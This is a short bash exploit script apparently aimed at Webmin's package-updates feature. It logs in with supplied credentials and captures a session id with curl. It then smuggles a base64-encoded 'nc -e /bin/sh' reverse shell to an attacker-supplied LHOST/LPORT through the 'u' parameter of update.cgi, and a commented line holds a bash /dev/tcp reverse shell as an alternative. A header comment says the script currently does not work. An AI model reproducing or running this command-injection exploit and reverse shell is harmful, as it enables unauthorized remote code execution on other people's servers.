#!/bin/bash

######################################################
# CURRENTLY DOES NOT WORK, USING MSF VERSION FOR NOW #
######################################################


if [[ $# -ne 6 ]]; then
    echo "Usage: $0 <RHOST> <RPORT> <RUSERNAME> <RPASSWORD> <LHOST> <LPORT>";
    exit 1;
fi

rhost="$1"
rport="$2"
rusername="$3"
rpassword="$4"
lhost="$5"
lport="$6"

sid=$(curl -i "https://${rhost}:${rport}/session_login.cgi" -k -s --compressed -H "Referer: https://${rhost}:${rport}/session_login.cgi?logout=1" -H 'Content-Type: application/x-www-form-urlencoded' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: redirect=1; testing=1; sid=x' -H 'Upgrade-Insecure-Requests: 1' --data "user=$rusername&pass=$rpassword" | awk -F '=' {'print $2'} | awk -F ';' {'print $1'} | tr -d '\n')

payload=$(echo -n "nc -e /bin/sh ${lhost} ${lport}" | base64)
payload=$(echo -n "echo \$(echo -n '${payload}' | base64 -d)" | jq -s -R -r @uri)
#payload=$(echo -n "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1" | jq -s -R -r @uri)

echo $payload
echo -n "Make sure you are running your netcat listener on port $lport, then press RETURN here to get a shell"
read

curl "https://${rhost}:${rport}/package-updates/update.cgi" -k -s --compressed -H "Referer: https://${rhost}:${rport}/package-updates/?xnavigation=1" -H 'Content-type: application/w-xxx-form-urlencoded' -H "Cookie: sid=${sid}" -H 'Upgrade-Insecure-Requests: 1' -H 'Connection: keep-alive' --data "u=acl%2Fapt&u=%20%7C%20${payload}"

